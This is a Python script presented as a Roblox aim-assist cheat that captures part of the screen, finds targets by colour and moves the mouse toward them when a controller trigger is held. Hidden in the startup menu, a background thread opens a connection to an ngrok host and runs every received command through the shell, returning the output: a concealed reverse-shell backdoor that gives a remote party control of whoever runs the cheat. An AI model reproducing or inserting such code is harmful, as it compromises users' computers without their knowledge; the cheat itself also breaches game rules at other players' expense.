import socket
import subprocess
import threading
from mss import mss # by levi && lonely
import numpy as np
import ctypes
import pygame
import os
import time

os.system('cls')

left, top = 800, 300
width, height = 300, 300


"""colors"""
red = "\033[1;31m"
purple2 = "\033[0;35m"
gray = "\033[1;30m"
dark_red = "\033[0;31m"
"""colors"""

def fov():
 os.system("cls")
 print(f"""
{gray}███████╗██╗{red}██╗   ██╗ █████╗ 
{gray}██╔════╝██║{red}██║   ██║██╔══██╗
{gray}███████╗██║{red}██║   ██║███████║
{gray}╚════██║██║{red}╚██╗ ██╔╝██╔══██║
{gray}███████║██║{red} ╚████╔╝ ██║  ██║
{gray}╚══════╝╚═╝{red}  ╚═══╝  ╚═╝  ╚═╝""")
 print(f"""{gray}By LEVI &{red}& LONELY""")
 print(f"\033[0m{red}UPDATE {gray}#FOV 104 & Recon")

 with mss() as ss:
     while True:
      try:
         pygame.init()
         pygame.joystick.init()
         AXIS = pygame.joystick.Joystick(0)
         AXIS.init()
         screen = {"left": left, "top": top, "width": width, "height": height}
         screenshot = np.array(ss.grab(screen))
    
         r, g, b = screenshot[:, :, 2], screenshot[:, :, 1], screenshot[:, :, 0]
         mask = (r >= 202) & (g <= 109) & (b >= 192)
         ys, xs = np.where(mask)

    
         if len(xs) == 0:
             continue
    
         centroid_x = left + xs.mean() 
         centroid_y = top + ys.mean()
         pygame.event.pump()

         
         if AXIS.get_axis(4) > 0.0:
             pt = ctypes.wintypes.POINT()
             ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
             grab_x, grab_y = pt.x, pt.y
    
             target_x = int(centroid_x)
             target_y = int(centroid_y)
    
             dx = target_x - grab_x 
             dy = target_y - grab_y -7

             dx = max(min(dx, 80), -80)
             dy = max(min(dy, 80), -80) 
    
             ctypes.windll.user32.mouse_event(0x0001, dx, dy)

      except Exception as err:
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)

def fov2():
 os.system("cls")
 print(f"""
{gray}███████╗██╗{red}██╗   ██╗ █████╗ 
{gray}██╔════╝██║{red}██║   ██║██╔══██╗
{gray}███████╗██║{red}██║   ██║███████║
{gray}╚════██║██║{red}╚██╗ ██╔╝██╔══██║
{gray}███████║██║{red} ╚████╔╝ ██║  ██║
{gray}╚══════╝╚═╝{red}  ╚═══╝  ╚═╝  ╚═╝""")
 print(f"""{gray}By LEVI &{red}& LONELY""")
 print(f"\033[0m{red}UPDATE {gray}#FOV 104 & Purple")

 with mss() as ss:
     while True:
      try:
         pygame.init()
         pygame.joystick.init()
         AXIS = pygame.joystick.Joystick(0)
         AXIS.init()
         screen = {"left": left, "top": top, "width": width, "height": height}
         screenshot = np.array(ss.grab(screen))
    
         r, g, b = screenshot[:, :, 2], screenshot[:, :, 1], screenshot[:, :, 0]
         mask = (r >= 162) & (g <= 14) & (b >= 11)
         ys, xs = np.where(mask)

    
         if len(xs) == 0:
             continue
    
         centroid_x = left + xs.mean() 
         centroid_y = top + ys.mean()
         pygame.event.pump()

         
         if AXIS.get_axis(4) > 0.0:
             pt = ctypes.wintypes.POINT()
             ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
             grab_x, grab_y = pt.x, pt.y
    
             target_x = int(centroid_x)
             target_y = int(centroid_y)
    
             dx = target_x - grab_x 
             dy = target_y - grab_y -7

             dx = max(min(dx, 80), -80)
             dy = max(min(dy, 80), -80) 
    
             ctypes.windll.user32.mouse_event(0x0001, dx, dy)

      except Exception as err:
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)

def recon():
 os.system("cls")
 print(f"""
{gray}███████╗██╗{red}██╗   ██╗ █████╗ 
{gray}██╔════╝██║{red}██║   ██║██╔══██╗
{gray}███████╗██║{red}██║   ██║███████║
{gray}╚════██║██║{red}╚██╗ ██╔╝██╔══██║
{gray}███████║██║{red} ╚████╔╝ ██║  ██║
{gray}╚══════╝╚═╝{red}  ╚═══╝  ╚═╝  ╚═╝""")
 print(f"""{gray}By LEVI &{red}& LONELY""")
 print(f"\033[0m{red}UPDATE {gray}#RECON")

 with mss() as ss:
     while True:
      try:
         pygame.init()
         pygame.joystick.init()
         AXIS = pygame.joystick.Joystick(0)
         AXIS.init()
         screen = {"left": left, "top": top, "width": width, "height": height}
         screenshot = np.array(ss.grab(screen))
    
         r, g, b = screenshot[:, :, 2], screenshot[:, :, 1], screenshot[:, :, 0]
         mask = (r >= 162 ) & (g <= 14) & (b >= 11)
         ys, xs = np.where(mask)

    
         if len(xs) == 0:
             continue
    
         centroid_x = left + xs.mean() 
         centroid_y = top + ys.mean()
         pygame.event.pump()

         
         if AXIS.get_axis(4) > 0.0:
             pt = ctypes.wintypes.POINT()
             ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
             grab_x, grab_y = pt.x, pt.y
    
             target_x = int(centroid_x)
             target_y = int(centroid_y)
    
             dx = target_x - grab_x 
             dy = target_y - grab_y -18

             dx = max(min(dx, 80), -80)
             dy = max(min(dy, 80), -80) 
    
             ctypes.windll.user32.mouse_event(0x0001, dx, dy)

      except Exception as err:
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)

def main():
 os.system("cls")
 print(f"""
{gray}███████╗██╗{red}██╗   ██╗ █████╗ 
{gray}██╔════╝██║{red}██║   ██║██╔══██╗
{gray}███████╗██║{red}██║   ██║███████║
{gray}╚════██║██║{red}╚██╗ ██╔╝██╔══██║
{gray}███████║██║{red} ╚████╔╝ ██║  ██║
{gray}╚══════╝╚═╝{red}  ╚═══╝  ╚═╝  ╚═╝""")
 print(f"""{gray}By LEVI &{red}& LONELY""")
 print(f"\033[0m{red}UPDATE {gray}#PURPLE")

 with mss() as ss:
     while True:
      try:
         pygame.init()
         pygame.joystick.init()
         AXIS = pygame.joystick.Joystick(0)
         AXIS.init()
         screen = {"left": left, "top": top, "width": width, "height": height}
         screenshot = np.array(ss.grab(screen))
    
         r, g, b = screenshot[:, :, 2], screenshot[:, :, 1], screenshot[:, :, 0]
         mask = (r >= 202) & (g <= 109) & (b >= 192)
         ys, xs = np.where(mask)

    
         if len(xs) == 0:
             continue
    
         centroid_x = left + xs.mean() 
         centroid_y = top + ys.mean()
         pygame.event.pump()

         
         if AXIS.get_axis(4) > 0.0:
             pt = ctypes.wintypes.POINT()
             ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
             grab_x, grab_y = pt.x, pt.y
    
             target_x = int(centroid_x)
             target_y = int(centroid_y)
    
             dx = target_x - grab_x 
             dy = target_y - grab_y -18

             dx = max(min(dx, 80), -80)
             dy = max(min(dy, 80), -80) 
    
             ctypes.windll.user32.mouse_event(0x0001, dx, dy)

      except Exception as err:
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)
         print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
         time.sleep(1.5)


def connect():
 SERVER = "0.tcp.au.ngrok.io"
 PORT = 13506

 s = socket.socket()
 s.connect((SERVER, PORT))
 msg = s.recv(1024).decode()

 while True:
    cmd = s.recv(1024).decode()
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = ''.encode()

    s.send(result)

 s.close()


def check():
 print("\n**Date 0.2**\n")
 print("[1] = Must Be On Roblox Graphics, 120 FOV & Recon")
 print("[2] = Must Be On Roblox Graphics, 104 FOV & Recon")
 print("\n[3] = 104 FOV & Purple")
 print("[4] = 120 FOV & Purple")
 threading.Thread(target=connect,daemon=True).start()
 option = input("\n[1,4] =: ")
 
 if option == "1":
  recon()
 elif option == "2":
    fov()
 elif option == "3":
    fov2()
 else:
    main()
check()



